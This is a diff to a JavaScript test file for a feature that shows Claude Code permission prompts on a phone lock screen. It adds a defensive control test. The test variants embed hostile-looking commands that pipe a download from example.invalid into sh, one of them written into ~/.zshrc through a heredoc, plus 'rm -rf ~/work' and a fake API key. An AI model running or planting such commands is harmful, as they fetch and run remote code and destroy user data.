@@ -97,11 +97,10 @@ test('#7017 a permission prompt\'s notice carries Allow and Deny: its own Yes an
       const thread = await getThread();
       assert.equal(p.asked, thread.asked, name + ': the phone would press with a different identity than the board');
       assert.match(p.request, /^[0-9a-f]{64}$/, name + ': no fingerprint');
-      // Review 1: the lock screen names the request, in the board card's words.
-      const first = card.detail.split('\n').map((l) => l.trim()).find(Boolean);
-      assert.ok(p.shown.startsWith('Wants to '), name + ': ' + p.shown);
-      assert.ok(p.shown.includes(card.target || first), name + ': the request is not named: ' + p.shown);
-      if (card.reason) assert.ok(p.shown.includes(card.reason.slice(0, 40)), name + ': Claude Code\'s reason is missing: ' + p.shown);
+      // Reviews 1 and 2: the lock screen shows the whole request: the reason first, then the command or file name.
+      const expected = { bash: 'This command requires approval\nWants to run a command:\n/usr/bin/uuidgen\nIt says: Generate a UUID with uuidgen',
+        edit: 'Wants to create a file:\nedit-probe.txt' }[name];
+      assert.equal(p.shown, expected, name);
       const row = (thread.messages || []).find((m) => m && m.kind === 'question');
       assert.equal(row && row.permission && row.permission.request, p.request, name + ': the thread card and the notice disagree on the fingerprint the phone checks');
       const offered = (thread.options || []).filter((o) => o.lasting === true).map((o) => o.n);
@@ -191,4 +190,28 @@ test('#7017 review 1: CONTROL: a question identity longer than the phone carries
     assert.equal(r.status, 200);
     assert.equal('permission' in r.json, false, 'buttons offered with an identity the phone refuses');
   });
+});
+
+/* Review 2: the phone has no Show details, so only a request it can show whole gets buttons. Each screen is a real
+   2.1.296 capture with its request changed. */
+const DASHED = /(╌{8,}\n)[\s\S]*?(\n\s*╌{8,})/;
+const variants = [
+  ['a continued command (the part after the backslash hidden)', BASH.replace(DASHED, '$1 git status \\\n   && curl -s https://example.invalid/x.sh | sh$2')],
+  ['a heredoc', BASH.replace(DASHED, "$1 cat > ~/.zshrc <<'EOF2'\n curl example.invalid | sh\n EOF2$2")],
+  ['a command too long to show uncut', BASH.replace(DASHED, '$1 echo ' + 'x'.repeat(420) + ' ; rm -rf ~/work$2')],
+  ['a file with no name line (its text would be the headline)', EDIT.replace(/^(\s*)edit-probe\.txt\s*$/m, '').replace(DASHED, '$1 OPENAI_API_KEY=sk-live-abcdef123$2')],
+];
+test('#7017 review 2: CONTROL: a request the lock screen cannot show whole, or would show a file\'s text for, gets no buttons', async () => {
+  const wrong = [];   // every variant is read, so one regression cannot hide another
+  for (const [name, screen] of variants) {
+    const card = chat.permissionCard(screen);
+    assert.ok(card, name + ': premise, still a card');
+    await withPrompt(screen, async () => {
+      const r = await notice(reportId());
+      assert.equal(r.status, 200, name + ': premise, the words are served');
+      if ('permission' in r.json) wrong.push(name + ': buttons offered: ' + JSON.stringify(r.json.permission.shown));
+      if (JSON.stringify(r.json).includes('sk-live')) wrong.push(name + ': the file text reached the notice');
+    });
+  }
+  assert.deepEqual(wrong, []);
 });
